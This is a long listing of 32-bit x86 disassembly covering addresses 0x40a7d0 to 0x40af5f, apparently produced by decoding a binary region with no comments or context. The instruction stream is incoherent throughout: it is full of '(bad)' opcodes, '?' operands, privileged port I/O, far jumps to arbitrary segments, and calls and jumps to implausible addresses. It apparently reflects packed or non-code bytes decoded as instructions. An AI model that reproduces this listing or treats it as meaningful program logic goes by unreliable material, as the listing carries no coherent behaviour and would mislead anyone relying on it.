  40a7d0:	jmp    0x6816:0x18005207
  40a7d7:	jb     0x40a821
  40a7d9:	push   edi
  40a7da:	add    BYTE PTR [eax+0x30],ch
  40a7dd:	pop    eax
  40a7de:	inc    ecx
  40a7df:	add    BYTE PTR [eax],dh
  40a7e1:	repz aas 
  40a7e3:	inc    ecx
  40a7e4:	fdivr  DWORD PTR [edx+0x57415c33]
  40a7ea:	add    bh,bh
  40a7ec:	cmc    
  40a7ed:	int    0xe6
  40a7ef:	imul   edi,DWORD PTR [ebp-0x47],0xfffffffd
  40a7f3:	push   0x558a0000
  40a7f8:	inc    ecx
  40a7f9:	add    al,ah
  40a7fb:	ins    DWORD PTR es:[edi],dx
  40a7fc:	inc    eax
  40a7fd:	inc    ecx
  40a7fe:	enter  0x256d,0x40
  40a802:	fst    DWORD PTR ds:0x15980268
  40a808:	cmp    bh,0xc5
  40a80b:	int    0xe6
  40a80d:	dec    edi
  40a80e:	cmp    eax,0x158dfdb9
  40a813:	sar    esp,0xff
  40a816:	das    
  40a817:	push   0x1599d9e8
  40a81c:	add    bh,bh
  40a81e:	cmc    
  40a81f:	mov    eax,0xed5075fd
  40a824:	xchg   edx,eax
  40a825:	jge    0x40a876
  40a827:	mov    edx,0x1554c2c7
  40a82c:	push   ebp
  40a82d:	mov    ebp,DWORD PTR [eax+ebx*4-0x3e]
  40a831:	hlt    
  40a832:	jle    0x40a7ee
  40a834:	std    
  40a835:	push   0x58
  40a837:	imul   esp,DWORD PTR [edi],0xffffffff
  40a83a:	add    eax,0xfd35e6d0
  40a83f:	mov    eax,0xbc5589fd
  40a844:	lds    eax,FWORD PTR ds:0x40f95d
  40a84a:	or     BYTE PTR ds:0x38310000,dl
  40a850:	xor    dh,0xf
  40a853:	mov    ds:0xbf994fe5,al
  40a858:	add    eax,DWORD PTR [eax]
  40a85a:	add    BYTE PTR [eax],al
  40a85c:	xor    DWORD PTR [ebx-0x44ceaf6b],esp
  40a862:	pop    edx
  40a863:	mov    WORD PTR [ecx-0x4],?
  40a866:	add    ebp,DWORD PTR [eax-0x51]
  40a869:	jp     0x40a8ae
  40a86b:	add    BYTE PTR [ecx+0x18],cl
  40a86e:	inc    esp
  40a86f:	inc    ecx
  40a870:	xor    DWORD PTR [edx+0x30],ebp
  40a873:	pop    esp
  40a874:	sbb    BYTE PTR [edx+eax*1-0x1],bh
  40a878:	cmp    al,0xc3
  40a87a:	(bad)  
  40a87c:	mov    ebp,0xa567e611
  40a881:	jp     0x40a8c6
  40a883:	add    BYTE PTR [ecx],bl
  40a885:	cmp    DWORD PTR [ebx+0x41],eax
  40a888:	xor    DWORD PTR [ebx-0x450fbfe1],esp
  40a88e:	pop    edx
  40a88f:	add    dh,BYTE PTR [ecx]
  40a891:	mov    ebx,0xb304fe82
  40a896:	fcmovb st,st(7)
  40a898:	test   DWORD PTR [ecx],ebx
  40a89a:	out    0x8c,al
  40a89c:	mov    ah,0xc9
  40a89e:	jecxz  0x40a89e
  40a8a0:	jbe    0x40a84c
  40a8a2:	ficom  DWORD PTR [ecx+0x0]
  40a8a5:	mov    ebx,0xb6dcff02
  40a8aa:	in     al,0x74
  40a8ac:	sub    ebx,esp
  40a8ae:	idiv   BYTE PTR [esi+edx*2-0x17]
  40a8b2:	mov    edx,0x4dbb35c1
  40a8b7:	mov    edx,DWORD PTR [ebp+0x3b]
  40a8ba:	shl    bl,0x3f
  40a8bd:	xchg   ecx,eax
  40a8be:	in     al,0x69
  40a8c0:	add    BYTE PTR [eax],al
  40a8c2:	xor    DWORD PTR [ebp+0x1c],edx
  40a8c5:	jmp    DWORD PTR [ebp+esi*4+0x14a5adda]
  40a8cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8cd:	in     eax,0xa9
  40a8cf:	pop    ecx
  40a8d0:	popf   
  40a8d1:	mov    ebp,0x42d6612d
  40a8d6:	xor    DWORD PTR [ecx+ebp*8],edx
  40a8d9:	add    esi,DWORD PTR [ecx]
  40a8db:	mov    eax,ds:0xcffced6b
  40a8e0:	jge    0x40a936
  40a8e2:	mov    DWORD PTR [eax],ebx
  40a8e4:	call   0xc0fcd9ec
  40a8e9:	push   edx
  40a8ea:	xor    DWORD PTR [ecx+edx*8],edx
  40a8ed:	lahf   
  40a8ee:	push   ds
  40a8ef:	push   ebp
  40a8f0:	jmp    0xa8955e50
  40a8f5:	add    ebx,DWORD PTR [ecx-0x7]
  40a8f8:	test   al,0x42
  40a8fa:	xor    edi,ecx
  40a8fc:	sti    
  40a8fd:	inc    edi
  40a8fe:	or     BYTE PTR [ebp-0x17],dl
  40a901:	in     al,0x3d
  40a903:	sbb    al,0x41
  40a905:	inc    edi
  40a906:	lods   eax,DWORD PTR ds:[esi]
  40a907:	iret   
  40a908:	sub    eax,0xa854cd5c
  40a90d:	add    ecx,DWORD PTR [ecx]
  40a90f:	mov    al,0xa8
  40a911:	inc    edx
  40a912:	xor    DWORD PTR [esp+ecx*8],edi
  40a915:	inc    ebx
  40a916:	lock adc eax,DWORD PTR [ecx+0x69143101]
  40a91d:	in     eax,0x5
  40a91f:	sbb    al,0x11
  40a921:	inc    ebx
  40a922:	jne    0x40a8f3
  40a924:	cmc    
  40a925:	jbe    0x40a927
  40a927:	add    BYTE PTR [ebp+0x67e4eec7],dh
  40a92d:	sar    DWORD PTR fs:[eax-0x1b16ec12],1
  40a934:	(bad)  
  40a936:	aad    0x6e
  40a938:	cmp    DWORD PTR [esi+eiz*2-0x5030b999],edi
  40a93f:	shl    DWORD PTR [edx],0x14
  40a942:	adc    al,0x79
  40a944:	dec    edx
  40a945:	xchg   ebx,eax
  40a946:	jmp    FWORD PTR [esi+edx*1+0x4a43003d]
  40a94d:	iret   
  40a94e:	je     0x40a941
  40a950:	cli    
  40a951:	cld    
  40a952:	jnp    0x40a8f2
  40a954:	or     eax,0x6895449c
  40a959:	adc    al,0x68
  40a95b:	mov    al,ds:0x11005572
  40a960:	int3   
  40a961:	push   cs
  40a962:	inc    ecx
  40a963:	jmp    0xc09cb175
  40a968:	jae    0x40a97e
  40a96a:	call   0xff0e5ce8
  40a96f:	repnz repnz inc edx
  40a972:	sbb    DWORD PTR [ecx+0x4600147a],edi
  40a978:	xchg   esp,eax
  40a979:	fldcw  WORD PTR ss:[ecx+0x46501473]
  40a980:	dec    edi
  40a981:	sbb    al,0xe8
  40a983:	outs   dx,BYTE PTR ds:[esi]
  40a984:	xchg   ecx,eax
  40a985:	int    0xfe
  40a987:	inc    ecx
  40a988:	fst    DWORD PTR [eax-0x1]
  40a98b:	add    BYTE PTR cs:[eax],al
  40a98e:	or     BYTE PTR [eax+ebp*2],dl
  40a991:	cmp    edx,esi
  40a993:	push   esp
  40a994:	add    BYTE PTR [ecx-0x16bef13b],dl
  40a99a:	xchg   ebp,eax
  40a99b:	pop    es
  40a99c:	pop    esp
  40a99d:	shl    bl,0x13
  40a9a0:	call   0xff0e5cea
  40a9a5:	bnd jb 0x40a9ea
  40a9a8:	sbb    DWORD PTR [ecx-0x1ffebf6],ebx
  40a9ae:	lea    esi,[esi]
  40a9b0:	fldcw  WORD PTR [ecx]
  40a9b2:	hlt    
  40a9b3:	adc    edx,DWORD PTR [eax-0x22]
  40a9b6:	clc    
  40a9b7:	sbb    ebp,eax
  40a9b9:	xor    dl,BYTE PTR [esi-0x453e0133]
  40a9bf:	push   eax
  40a9c0:	inc    DWORD PTR [eax]
  40a9c2:	ja     0x40a976
  40a9c4:	jae    0x40a9c2
  40a9c6:	ja     0x40aa34
  40a9c8:	or     al,ch
  40a9ca:	loop   0x40aa39
  40a9cc:	(bad)  
  40a9cd:	call   ecx
  40a9cf:	(bad)  
  40a9d0:	add    al,BYTE PTR [eax]
  40a9d2:	pop    ebp
  40a9d3:	popf   
  40a9d4:	jmp    0x3257:0x54b4cc83
  40a9db:	sbb    BYTE PTR [edx+0x2a],ch
  40a9de:	mov    bh,0x6b
  40a9e0:	or     al,ch
  40a9e2:	xchg   esp,eax
  40a9e3:	ins    DWORD PTR es:[edi],dx
  40a9e4:	(bad)  
  40a9e5:	inc    DWORD PTR [ecx-0x279503a5]
  40a9eb:	mov    ecx,0xb15782a7
  40a9f0:	or     eax,eax
  40a9f2:	add    BYTE PTR [eax],al
  40a9f4:	cld    
  40a9f5:	ror    BYTE PTR [esi+0x68],1
  40a9f8:	enter  0xef11,0xbe
  40a9fc:	lock mov ebx,0x1d8413e
  40aa02:	push   DWORD PTR [ebp-0x40]
  40aa05:	mov    ecx,0xb0f7a30f
  40aa0a:	out    0x3d,al
  40aa0c:	out    0xb2,al
  40aa0e:	std    
  40aa0f:	mov    ebx,DWORD PTR [ebp-0x77bed794]
  40aa15:	sahf   
  40aa16:	cmp    edi,DWORD PTR [ecx-0x80]
  40aa19:	pop    eax
  40aa1a:	add    BYTE PTR [eax+0x45741167],al
  40aa20:	mov    al,0xe6
  40aa22:	ds inc ecx
  40aa24:	mov    BYTE PTR [edx],cl
  40aa26:	call   0x5242e8
  40aa2b:	or     ebx,DWORD PTR [eax]
  40aa2d:	ins    BYTE PTR es:[edi],dx
  40aa2e:	pop    ds
  40aa2f:	push   esi
  40aa30:	xor    BYTE PTR [eax+0x157ff85],bh
  40aa36:	push   0xbcc24800
  40aa3b:	push   0x4142dd31
  40aa40:	xor    DWORD PTR [ebx],ecx
  40aa42:	jecxz  0x40aab8
  40aa44:	sub    ebx,esp
  40aa46:	mov    ah,0xa1
  40aa48:	ss mov gs,edx
  40aa4b:	std    
  40aa4c:	lods   al,BYTE PTR ds:[esi]
  40aa4d:	xchg   cl,ah
  40aa4f:	jmp    0x3031:0x3d83f530
  40aa56:	fiadd  WORD PTR [ebp+0x0]
  40aa59:	add    BYTE PTR ds:0xeb8c2ea,dl
  40aa5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa60:	loope  0x40aa60
  40aa62:	add    ecx,DWORD PTR ds:0x5284071b
  40aa68:	loop   0x40aade
  40aa6a:	cmc    
  40aa6b:	dec    ebp
  40aa6c:	pop    eax
  40aa6d:	or     cl,bl
  40aa6f:	and    BYTE PTR [edi-0x1],bl
  40aa72:	out    0x1d,al
  40aa74:	inc    edx
  40aa75:	leave  
  40aa76:	repz mov esi,0x5eaa5502
  40aa7c:	xchg   bl,al
  40aa7e:	int    0x8c
  40aa80:	cmp    DWORD PTR [edx+0x31],ebp
  40aa83:	shr    DWORD PTR ds:0xeac344ff,1
  40aa89:	stc    
  40aa8a:	cmp    ecx,DWORD PTR [esi]
  40aa8c:	loop   0x40aa16
  40aa8e:	hlt    
  40aa8f:	push   es
  40aa90:	mov    ?,WORD PTR [esp+ebx*1]
  40aa93:	adc    eax,DWORD PTR [ebp+0x0]
  40aa96:	stos   BYTE PTR es:[edi],al
  40aa97:	mov    bh,0x5b
  40aa99:	sub    al,dh
  40aa9b:	mov    edx,0xaf313e82
  40aaa0:	inc    edi
  40aaa1:	push   0x437c2f
  40aaa6:	out    0x22,al
  40aaa8:	and    dl,BYTE PTR [eax+0x31]
  40aaab:	mov    ebx,0xe5e5c00d
  40aab0:	cmp    al,ch
  40aab2:	shl    DWORD PTR ds:0x1401fee2,cl
  40aab8:	push   ecx
  40aab9:	add    al,0x31
  40aabb:	mov    ebp,0x6c9e
  40aac0:	dec    ecx
  40aac1:	push   ebx
  40aac2:	sub    BYTE PTR [ecx+eiz*8],al
  40aac5:	int3   
  40aac6:	push   ebx
  40aac7:	or     al,0x49
  40aac9:	addr16 mov esp,ecx
  40aacc:	aaa    
  40aacd:	mov    ebx,0xcc2e5f68
  40aad2:	rol    DWORD PTR [ebx],0x6f
  40aad5:	xchg   esp,eax
  40aad6:	out    dx,al
  40aad7:	add    esp,DWORD PTR [esi+ecx*8-0x2b9c1fd2]
  40aade:	pop    edi
  40aadf:	loope  0x40aaf0
  40aae1:	int3   
  40aae2:	xchg   ebp,eax
  40aae3:	(bad)  
  40aae4:	aam    0xc
  40aae6:	out    0x56,al
  40aae8:	mov    edx,0xf7dffbcb
  40aaed:	inc    ecx
  40aaee:	icebp  
  40aaef:	jmp    0x40aafb
  40aaf1:	dec    edi
  40aaf2:	jbe    0x40aad5
  40aaf4:	xchg   DWORD PTR [edx-0x60],ebp
  40aaf7:	(bad)  
  40aaf8:	xor    dl,BYTE PTR [esp+edi*4]
  40aafb:	mov    edx,cs
  40aafd:	xchg   edi,eax
  40aafe:	and    al,0xe0
  40ab00:	pop    eax
  40ab01:	adc    al,0xc3
  40ab03:	das    
  40ab04:	mov    BYTE PTR [ecx-0x1f],0xeb
  40ab08:	cmp    al,0x4e
  40ab0a:	inc    esi
  40ab0b:	loope  0x40aab6
  40ab0d:	push   ecx
  40ab0e:	cmp    eax,0xe93e316e
  40ab13:	imul   edi,DWORD PTR [edi],0x55
  40ab16:	test   al,0x3
  40ab18:	or     DWORD PTR [ecx+ebp*8],edx
  40ab1b:	add    esi,DWORD PTR [ecx-0x707c4f44]
  40ab21:	retf   
  40ab22:	loope  0x40aae7
  40ab24:	add    BYTE PTR [eax],al
  40ab26:	add    ch,BYTE PTR [ebx]
  40ab28:	mov    ecx,0x5928feb
  40ab2d:	loope  0x40ab15
  40ab2f:	cmp    ebp,ecx
  40ab31:	add    ebx,DWORD PTR [esi-0x76]
  40ab34:	inc    DWORD PTR [eax-0x16beaac9]
  40ab3a:	and    cl,bl
  40ab3c:	je     0x40ab2f
  40ab3e:	dec    edx
  40ab3f:	mov    ah,0xa0
  40ab41:	ficom  WORD PTR [ecx-0x4d]
  40ab44:	or     al,0x54
  40ab46:	push   eax
  40ab47:	retf   0x54fe
  40ab4a:	push   ecx
  40ab4b:	retf   0xf174
  40ab4e:	dec    edx
  40ab4f:	dec    ebx
  40ab50:	jp     0x40ab10
  40ab52:	adc    esp,ebx
  40ab54:	shr    ebp,0x32
  40ab57:	popa   
  40ab58:	mov    edi,DWORD PTR [ebp+0x13fbd6b5]
  40ab5e:	sub    eax,0x679e2d3e
  40ab63:	sbb    al,0xe8
  40ab65:	int    0x64
  40ab67:	retf   
  40ab68:	(bad)  
  40ab69:	pusha  
  40ab6a:	ja     0x40ab34
  40ab6c:	addr16 jmp 0x11fe66a4
  40ab72:	daa    
  40ab73:	push   ebp
  40ab74:	inc    ecx
  40ab75:	jmp    0x288215d4
  40ab7a:	xor    eax,0xcaf174cb
  40ab7f:	mov    esi,0xc9d15ea0
  40ab84:	je     0x40abdb
  40ab86:	sar    DWORD PTR [edi],1
  40ab88:	or     BYTE PTR [ecx+0x0],al
  40ab8b:	add    BYTE PTR [edi+0x4e],dh
  40ab8e:	inc    DWORD PTR [esi-0x15]
  40ab91:	aam    0x3
  40ab93:	jmp    0x6b2c4aff
  40ab98:	outs   dx,BYTE PTR ds:[esi]
  40ab99:	into   
  40ab9a:	imul   ebp,ecx,0x9cfefa0c
  40aba0:	sub    bh,BYTE PTR [eax+ebp*8-0x77366e60]
  40aba7:	lods   al,BYTE PTR ds:[esi]
  40aba8:	data16 xor al,BYTE PTR [eax]
  40abab:	jmp    0xa83431
  40abb0:	mov    eax,ds:0xc0004155
  40abb5:	xor    al,0x41
  40abb7:	inc    ecx
  40abb8:	pop    eax
  40abb9:	mov    bl,0x73
  40abbb:	or     BYTE PTR [eax],dh
  40abbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abbe:	lahf   
  40abbf:	dec    DWORD PTR [edi+0x37]
  40abc2:	add    BYTE PTR [eax],al
  40abc4:	jg     0x40ab6f
  40abc6:	data16 je 0x40abe2
  40abc9:	push   ecx
  40abca:	add    BYTE PTR [eax-0x12],ch
  40abcd:	push   eax
  40abce:	inc    ecx
  40abcf:	add    BYTE PTR [edi+0x6c],ch
  40abd2:	or     al,ch
  40abd4:	xchg   edx,eax
  40abd5:	outs   dx,DWORD PTR ds:[esi]
  40abd6:	std    
  40abd7:	(bad)  
  40abd8:	fild   QWORD PTR [ebx-0x4]
  40abdb:	jmp    DWORD PTR [ebp+0x18]
  40abde:	call   0xfe29fdd6
  40abe3:	leave  
  40abe4:	ficomp DWORD PTR [eax+eax*1]
  40abe7:	push   ebp
  40abe8:	xchg   ebx,eax
  40abe9:	les    eax,FWORD PTR [ecx+0x539dacc4]
  40abef:	adc    BYTE PTR [eax],al
  40abf1:	add    BYTE PTR [ebx+0x5d0068c6],al
  40abf7:	pop    ebx
  40abf8:	cld    
  40abf9:	push   eax
  40abfa:	pop    edi
  40abfb:	imul   ecx,DWORD PTR [eax],0x6a
  40abfe:	enter  0x73ea,0x10
  40ac02:	dec    edi
  40ac03:	push   es
  40ac04:	sbb    al,0x85
  40ac06:	sbb    BYTE PTR [ebx+0x27],ch
  40ac09:	mov    eax,DWORD PTR [ebp-0x37957117]
  40ac0f:	cmp    eax,DWORD PTR [eax]
  40ac11:	push   0x156f
  40ac16:	outs   dx,DWORD PTR ds:[esi]
  40ac17:	imul   ecx,DWORD PTR [edx+ebp*2],0x5f
  40ac1b:	jmp    0x15b2b090
  40ac20:	push   0x0
  40ac22:	inc    eax
  40ac23:	ja     0x40ac70
  40ac25:	add    BYTE PTR [eax+0x3175fe45],bl
  40ac2b:	pop    ds
  40ac2c:	in     al,dx
  40ac2d:	pop    edi
  40ac2e:	out    dx,eax
  40ac2f:	mov    edx,0xbf73c902
  40ac34:	add    dl,BYTE PTR [ebp-0x46]
  40ac37:	pop    ss
  40ac38:	add    ebx,0x65
  40ac3b:	cmp    DWORD PTR ss:[edx+ebp*4],edx
  40ac3f:	in     eax,dx
  40ac40:	push   0xdff8a400
  40ac45:	dec    edi
  40ac46:	dec    esi
  40ac47:	pusha  
  40ac48:	adc    bh,bh
  40ac4a:	mov    esp,0x3e0068b2
  40ac4f:	pusha  
  40ac50:	clc    
  40ac51:	(bad)  
  40ac52:	jecxz  0x40ac76
  40ac54:	mov    DWORD PTR [edi+0x12a40000],edi
  40ac5a:	mov    edx,DWORD PTR [ebp+eiz*1+0x6b]
  40ac5e:	imul   eax,DWORD PTR [eax],0xff6abb8b
  40ac64:	xor    bh,BYTE PTR [ebx-0x347b00fe]
  40ac6a:	push   0x82d06ff
  40ac6f:	push   0x31
  40ac71:	adc    eax,0x5ae804
  40ac76:	add    al,0x0
  40ac78:	ror    DWORD PTR [ecx+0x58],0xfc
  40ac7c:	fldlg2 
  40ac7e:	dec    esp
  40ac7f:	add    BYTE PTR [ecx],dh
  40ac81:	je     0x40ac43
  40ac83:	rdtsc  
  40ac85:	mov    BYTE PTR [ecx+0xadfceeb],cl
  40ac8b:	(bad)  
  40ac8c:	cmp    al,0xc3
  40ac8e:	jmp    0x3cfe:0xde5a3952
  40ac95:	mov    edi,0xbafc97ea
  40ac9a:	add    dl,cl
  40ac9c:	xchg   ecx,eax
  40ac9d:	cmp    eax,0xfa0101c3
  40aca2:	push   edi
  40aca3:	or     al,0x96
  40aca5:	adc    ebx,DWORD PTR [ebx+edi*8-0x215ebc6a]
  40acac:	xchg   eax,ecx
  40acae:	fwait
  40acaf:	idiv   DWORD PTR [edi+0x3e]
  40acb2:	stc    
  40acb3:	fdivp  st(5),st
  40acb5:	sub    edx,DWORD PTR [ecx]
  40acb7:	popa   
  40acb8:	jmp    0x10caa85
  40acbd:	add    BYTE PTR [eax+0x1f],dh
  40acc0:	jmp    0xedf856fd
  40acc5:	push   edi
  40acc6:	sub    ecx,ecx
  40acc8:	pop    ebx
  40acc9:	cld    
  40acca:	push   esi
  40accb:	sub    eax,0xc847dd61
  40acd0:	pop    ebx
  40acd1:	adc    BYTE PTR [ecx-0x6a],cl
  40acd4:	sbb    al,0x4
  40acd6:	xor    DWORD PTR [ecx+ebx*1-0x23],edx
  40acda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40acdb:	sbb    BYTE PTR [esi-0xe43b6a9],bh
  40ace1:	pop    ebx
  40ace2:	push   ds
  40ace3:	enter  0x57ad,0x3d
  40ace7:	(bad)  
  40ace8:	sbb    esi,esp
  40acea:	cmovb  eax,DWORD PTR [ecx]
  40aced:	in     al,dx
  40acee:	push   ebp
  40acef:	dec    esp
  40acf0:	xchg   esi,eax
  40acf1:	fucomp st(1)
  40acf3:	shl    ah,cl
  40acf5:	add    ebx,DWORD PTR [ebx+ebx*4-0x6c]
  40acf9:	xor    edx,0xffffffe0
  40acfc:	jns    0x40acdb
  40acfe:	out    0xc7,eax
  40ad00:	sti    
  40ad01:	sti    
  40ad02:	lods   eax,DWORD PTR ds:[esi]
  40ad03:	xchg   ecx,eax
  40ad04:	call   0xb90884e8
  40ad09:	fadd   QWORD PTR [ebp+0x1c]
  40ad0c:	push   ecx
  40ad0d:	mov    esi,0xdd55c7c4
  40ad12:	inc    ebp
  40ad13:	sub    al,0x5c
  40ad15:	xchg   DWORD PTR [esi-0x122ba41],esi
  40ad1b:	(bad)  
  40ad1c:	mov    bl,0xf
  40ad1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad1f:	inc    ecx
  40ad20:	add    cl,ah
  40ad22:	add    BYTE PTR [eax],al
  40ad24:	mov    ah,BYTE PTR [ebx]
  40ad26:	jmp    FWORD PTR [esi]
  40ad28:	je     0x40ad67
  40ad2a:	add    BYTE PTR [ebx-0x1500c3ce],dl
  40ad30:	xor    dl,BYTE PTR [ecx*4-0x13fca94]
  40ad37:	push   cs
  40ad38:	cmp    eax,0x606ff3a
  40ad3d:	and    al,0x6a
  40ad3f:	jmp    0x5c28c11c
  40ad44:	add    DWORD PTR [eax+eax*1],edx
  40ad47:	es scas al,BYTE PTR es:[edi]
  40ad49:	mov    bh,0xf2
  40ad4b:	out    0x6d,al
  40ad4d:	pop    ss
  40ad4e:	add    cl,ch
  40ad50:	xor    cl,bh
  40ad52:	test   ch,bl
  40ad54:	popa   
  40ad55:	(bad)  
  40ad56:	(bad)  
  40ad57:	jmp    0x40ad8b
  40ad59:	adc    al,0x0
  40ad5b:	scas   al,BYTE PTR es:[edi]
  40ad5c:	mov    bh,0xbe
  40ad5e:	repnz mov esi,0xe9fec705
  40ad64:	xor    cl,bh
  40ad66:	test   BYTE PTR [ebp-0x160139ff],ch
  40ad6c:	xor    dl,BYTE PTR [eax+eax*1]
  40ad6f:	jb     0x40adb0
  40ad71:	sub    al,0x8b
  40ad73:	sti    
  40ad74:	mov    BYTE PTR [ecx*4-0x13e1d9c],dl
  40ad7b:	xchg   BYTE PTR [edx],ah
  40ad7d:	cdq    
  40ad7e:	test   BYTE PTR [ebp+0x19fec601],cl
  40ad84:	scas   al,BYTE PTR es:[edi]
  40ad85:	(bad)  
  40ad86:	out    0x7a,eax
  40ad88:	add    BYTE PTR [eax],al
  40ad8a:	cmc    
  40ad8b:	lds    ecx,FWORD PTR [edi+0x66]
  40ad8e:	addr16 and al,0xff
  40ad91:	aam    0x36
  40ad93:	(bad)  
  40ad94:	je     0x40ad77
  40ad96:	dec    eax
  40ad97:	adc    al,0xff
  40ad99:	aam    0xba
  40ad9b:	lds    edx,FWORD PTR [ecx+0x0]
  40ad9e:	fcom   QWORD PTR [ebx-0x17941745]
  40ada4:	std    
  40ada5:	add    BYTE PTR [edi-0x77fee572],dl
  40adab:	adc    al,BYTE PTR [ebx-0x21bdb43]
  40adb1:	call   FWORD PTR [eax-0x76f07be9]
  40adb7:	adc    al,BYTE PTR [eax]
  40adb9:	(bad)  
  40adba:	or     eax,0x37fff17f
  40adbf:	adc    eax,DWORD PTR [eax]
  40adc1:	out    dx,eax
  40adc2:	cmp    ecx,DWORD PTR es:[ebp-0x72ed76bf]
  40adc9:	test   DWORD PTR [eax-0x1a],ecx
  40adcc:	std    
  40adcd:	dec    DWORD PTR [eax]
  40adcf:	mov    eax,0x12584c12
  40add4:	test   eax,eax
  40add6:	fmul   QWORD PTR [ebp-0x39]
  40add9:	test   DWORD PTR [esi+ebx*8-0x3],edi
  40addd:	call   FWORD PTR [ecx]
  40addf:	adc    ch,bh
  40ade1:	mov    esi,0x41404980
  40ade6:	or     BYTE PTR [ebp-0x163bff7d],bl
  40adec:	std    
  40aded:	push   eax
  40adee:	add    BYTE PTR [eax],al
  40adf0:	mov    al,ds:0x180049e3
  40adf5:	xchg   ebp,eax
  40adf6:	mov    esi,0x83d2eb74
  40adfb:	aam    0x9b
  40adfd:	jmp    0xbb18b0ff
  40ae02:	mov    esp,0x414f1f68
  40ae07:	add    BYTE PTR [ebp-0x6d],dl
  40ae0a:	(bad)  
  40ae0b:	sti    
  40ae0c:	inc    edi
  40ae0d:	jmp    0x554f9660
  40ae12:	add    BYTE PTR [eax],al
  40ae14:	dec    ebp
  40ae15:	ror    BYTE PTR ds:0x39a3185,1
  40ae1b:	add    BYTE PTR [ecx],dh
  40ae1d:	ror    ebp,cl
  40ae1f:	inc    eax
  40ae20:	lock mov edx,0xff318487
  40ae26:	(bad)  
  40ae28:	add    DWORD PTR [ebx-0x4d],edx
  40ae2b:	dec    ebx
  40ae2c:	xor    DWORD PTR [ebx-0x53fa3ff3],edi
  40ae32:	test   DWORD PTR [edi+ebx*1],edi
  40ae35:	jns    0x40ae7a
  40ae37:	add    BYTE PTR [ecx],dh
  40ae39:	scas   al,BYTE PTR es:[edi]
  40ae3a:	jle    0x40adbc
  40ae3c:	xor    DWORD PTR [ebx+0x23a4ff02],edi
  40ae42:	xlat   BYTE PTR ds:[ebx]
  40ae43:	(bad)  
  40ae44:	ss sbb di,0xbe62
  40ae4a:	fsin   
  40ae4c:	pushf  
  40ae4d:	(bad)  
  40ae4e:	aad    0xfe
  40ae50:	dec    esi
  40ae51:	ds and bl,0x0
  40ae55:	add    BYTE PTR [edx-0x1a],al
  40ae58:	(bad)  [esp+esi*4+0x36fed583]
  40ae5f:	or     ebp,DWORD PTR [esi+0x1]
  40ae62:	fwait
  40ae63:	mov    ebx,0xbb9b006c
  40ae68:	ins    BYTE PTR es:[edi],dx
  40ae69:	add    BYTE PTR [edi+esi*1+0x7616f2e3],ch
  40ae70:	xor    bh,bh
  40ae72:	and    al,0xc5
  40ae74:	inc    esp
  40ae75:	inc    ecx
  40ae76:	xor    edx,eax
  40ae78:	ret    0x7673
  40ae7b:	sahf   
  40ae7c:	dec    edi
  40ae7d:	adc    al,0xf6
  40ae7f:	pop    edi
  40ae80:	mov    ebx,0xd98deef2
  40ae85:	mov    ah,0x5
  40ae87:	dec    edx
  40ae88:	(bad)  
  40ae8a:	faddp  st(7),st
  40ae8c:	repnz (bad) 
  40ae8e:	pushf  
  40ae8f:	sahf   
  40ae90:	aad    0xfe
  40ae92:	into   
  40ae93:	adc    edx,DWORD PTR [ecx-0x22]
  40ae96:	vminps ymm3,ymm7,ymm2
  40ae9a:	test   edi,esp
  40ae9c:	pop    ecx
  40ae9d:	fidiv  DWORD PTR [edi+0x314d2ebb]
  40aea3:	adc    al,0x52
  40aea5:	clc    
  40aea6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aea7:	ds aad 0xda
  40aeaa:	in     eax,0xbb
  40aeac:	cmp    edx,ebx
  40aeae:	xchg   edi,eax
  40aeaf:	les    esi,FWORD PTR [ebx-0x19]
  40aeb2:	add    esp,0x25
  40aeb5:	(bad)  
  40aeb7:	and    ebx,DWORD PTR [esi]
  40aeb9:	nop
  40aeba:	add    BYTE PTR [eax],al
  40aebc:	(bad)  
  40aebd:	rcl    BYTE PTR ds:0xbe28eda,0xda
  40aec4:	outs   dx,DWORD PTR ds:[esi]
  40aec5:	les    edi,FWORD PTR [ebx]
  40aec7:	out    0x63,eax
  40aec9:	(bad)  
  40aeca:	std    
  40aecb:	jmp    0xd168:0x3e95882
  40aed2:	aam    0x3
  40aed4:	in     al,0x98
  40aed6:	aam    0x85
  40aed8:	jb     0x40ae65
  40aeda:	xor    eax,0x621fe58d
  40aedf:	mul    BYTE PTR [ebp-0x64cb6eb2]
  40aee5:	adc    al,0xc6
  40aee7:	dec    edi
  40aee8:	xor    eax,0x8b0c33c3
  40aeed:	adc    al,0xb6
  40aeef:	dec    edi
  40aef0:	cmp    eax,0xb4301ac3
  40aef5:	aam    0x1b
  40aef7:	xor    dh,ch
  40aef9:	pop    ecx
  40aefa:	pop    ebp
  40aefb:	add    al,0x31
  40aefd:	adc    al,0xe9
  40aeff:	mov    WORD PTR [ebp+0x7c],ds
  40af02:	popa   
  40af03:	idiv   BYTE PTR [ebp-0x4bcbbaa7]
  40af09:	pop    ecx
  40af0a:	test   eax,0x244b34
  40af0f:	jbe    0x40af77
  40af11:	jl     0x40af11
  40af13:	sbb    edi,DWORD PTR [ecx]
  40af15:	xchg   edi,eax
  40af16:	jl     0x40aebd
  40af18:	sub    eax,0x666c2748
  40af1d:	aam    0xfe
  40af1f:	fadd   QWORD PTR [eax]
  40af21:	add    dh,al
  40af23:	ret    0xf974
  40af26:	mov    DWORD PTR [edx],ecx
  40af28:	(bad)  
  40af29:	mov    esp,0xf174c32e
  40af2e:	mov    ah,bh
  40af30:	cld    
  40af31:	ss js  0x40aef6
  40af34:	ss inc ecx
  40af36:	push   ss
  40af37:	dec    edi
  40af38:	add    cl,ch
  40af3a:	lods   eax,DWORD PTR ds:[esi]
  40af3b:	fiadd  DWORD PTR [ebx]
  40af3d:	push   ds
  40af3e:	idiv   BYTE PTR [edi+0x74]
  40af41:	aaa    
  40af42:	test   BYTE PTR [edx-0x71354b76],cl
  40af48:	adc    DWORD PTR [esi],eax
  40af4a:	idiv   BYTE PTR [ebx-0x2]
  40af4d:	fwait
  40af4e:	sub    ah,BYTE PTR [ebx-0x37]
  40af51:	sub    ebx,DWORD PTR [ebp-0x3d]
  40af54:	push   ebx
  40af55:	bound  ebx,QWORD PTR [ecx-0x6c]
  40af58:	ret    
  40af59:	loope  0x40afc3
  40af5b:	ret    0x36fe
  40af5e:	lods   al,BYTE PTR ds:[esi]
  40af5f:	push   0x903c6210
